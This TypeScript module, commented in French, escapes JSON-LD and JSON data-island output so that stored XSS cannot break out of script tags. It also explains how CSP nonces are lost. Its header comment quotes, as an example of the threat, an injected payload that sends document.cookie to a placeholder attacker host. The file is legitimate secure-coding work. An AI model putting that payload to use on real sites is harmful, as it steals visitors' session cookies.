// src/lib/jsonLd.ts
//
// Serialisation sure d'un objet Schema.org vers un <script type="application/ld+json">.
//
// POURQUOI CE MODULE EXISTE
// -------------------------
// `JSON.stringify()` respecte la spec JSON, qui ignore totalement le contexte
// HTML/JS dans lequel sa sortie atterrit. Il n'echappe donc PAS `</script>`.
// Un champ issu de la base (nom d'un benevole, titre d'article, competence)
// contenant :
//
//     </script><script>fetch('https://evil.tld/?c='+document.cookie)</script>
//
// produit un <script> attaquant dans le HTML rendu. XSS stockee, page publique.
//
// CE QU'ON ECHAPPE, ET POURQUOI
// -----------------------------
//   <        ferme la balise en cours ; `<!--` bascule le parseur en mode commentaire
//   >        symetrique, refuse par le tokenizer HTML dans un contexte script
//   &        `&lt;` se redecode en `<` cote HTML -- sans lui, l'echappement de `<` fuit
//   U+2028   LINE SEPARATOR      : valide en JSON, terminateur de ligne en JS
//   U+2029   PARAGRAPH SEPARATOR : idem
//
// L'echappement `\uXXXX` est transparent : le parseur JSON le redecode. La donnee
// reste identique, seule sa representation change. Aucun risque de casser un
// schema valide.
//
// Les clefs U+2028 / U+2029 sont ecrites en sequences d'echappement, jamais en
// caracteres litteraux : ces derniers sont invisibles dans un editeur et
// silencieusement normalises par certains outils de formatage.
//
// USAGE
// -----
//     ---
//     import { jsonLd } from '@/lib/jsonLd';
//     ---
//     <script type="application/ld+json" is:inline set:html={jsonLd(schema)} />
//
// NE JAMAIS ecrire `set:html={JSON.stringify(x)}` pour du JSON-LD.

const LINE_SEPARATOR = '\u2028';
const PARAGRAPH_SEPARATOR = '\u2029';

const ESCAPES: Readonly<Record<string, string>> = {
  '<': '\\u003c',
  '>': '\\u003e',
  '&': '\\u0026',
  [LINE_SEPARATOR]: '\\u2028',
  [PARAGRAPH_SEPARATOR]: '\\u2029',
};

const UNSAFE = /[<>&\u2028\u2029]/g;

/**
 * Serialise `data` en JSON sur, pour insertion dans un
 * `<script type="application/ld+json">`.
 *
 * @param data Objet Schema.org (ou tout objet JSON-serialisable).
 * @returns Chaine JSON dont aucun caractere ne peut casser le contexte HTML/JS.
 */
export function jsonLd(data: unknown): string {
  return JSON.stringify(data).replace(UNSAFE, (char) => ESCAPES[char] as string);
}

/**
 * Serialise `data` pour un ilot de donnees
 * `<script type="application/json" id="...">`, relu cote client par un script
 * portant le nonce CSP.
 *
 * POURQUOI CET ILOT PLUTOT QUE `define:vars`
 * ------------------------------------------
 * Un `<script>` qui utilise `define:vars` perd son attribut `nonce` au build
 * (constate sur l'artefact : aucun `addAttribute(nonce, ...)` n'est emis pour
 * ces balises). Sous `script-src 'nonce-...' 'strict-dynamic'`, le script est
 * donc bloque en production -- silencieusement, car le mode dev ajoute
 * `'unsafe-inline'`. Cf. scripts/assert-build-invariants.mjs.
 *
 * Un bloc `type="application/json"` n'est PAS execute : c'est un data-block,
 * hors du perimetre de `script-src`. Il vit toutefois dans le meme contexte de
 * parsing HTML, ou `</script>` reste tout aussi dangereux -- d'ou le meme
 * echappement que jsonLd().
 */
export const jsonIsland = jsonLd;
